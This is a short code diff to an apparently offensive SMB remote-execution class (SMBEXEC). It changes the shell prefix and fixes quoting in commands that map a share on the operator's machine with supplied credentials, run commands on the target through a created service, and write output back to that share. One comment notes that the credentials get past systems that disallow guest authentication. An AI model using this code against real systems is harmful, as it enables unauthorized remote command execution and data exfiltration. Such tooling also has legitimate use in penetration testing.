@@ -36,7 +36,7 @@ class SMBEXEC:
         self.__output = None
         self.__batchFile = None
         self.__outputBuffer = ''
-        self.__shell = '%COMSPEC% /Q /c '
+        self.__shell = 'cmd.exe /Q /c '
         self.__retOutput = False
         self.__rpctransport = None
         self.__scmr = None
@@ -102,8 +102,8 @@ class SMBEXEC:
 
         if self.__retOutput:
             #adding creds gets past systems disallowing guest-auth
-            command = self.__shell + 'net use /persistent:no \\\\{}\\{} /user:{} {} & '.format(local_ip, self.__share_name, self.__username, self.__password) 
-            command += self.__shell + data + ' ^> \\\\{}\\{}\\{}'.format(local_ip, self.__share_name, self.__output)
+            command = self.__shell + '"net use /persistent:no \\\\{}\\{} /user:{} {} & '.format(local_ip, self.__share_name, self.__username, self.__password) 
+            command += self.__shell + data + ' ^> \\\\{}\\{}\\{}"'.format(local_ip, self.__share_name, self.__output)
         else:
             command = self.__shell + data
 
@@ -114,7 +114,8 @@ class SMBEXEC:
 
         command = self.__shell + '\\\\{}\\{}\\{}'.format(local_ip, self.__share_name, self.__batchFile)
         #adding creds gets past systems disallowing guest-auth
-        command = '%COMSPEC% /Q /c "net use /persistent:no \\\\{}\\{} /user:{} {} & {}'.format(local_ip, self.__share_name, self.__username, self.__password, command)
+        command = self.__shell + '"net use /persistent:no \\\\{}\\{} /user:{} {} & {} "'.format(local_ip, self.__share_name, self.__username, self.__password, command)
+        
         logging.debug('Command to execute: ' + command)
 
         logging.debug('Remote service {} created.'.format(self.__serviceName))
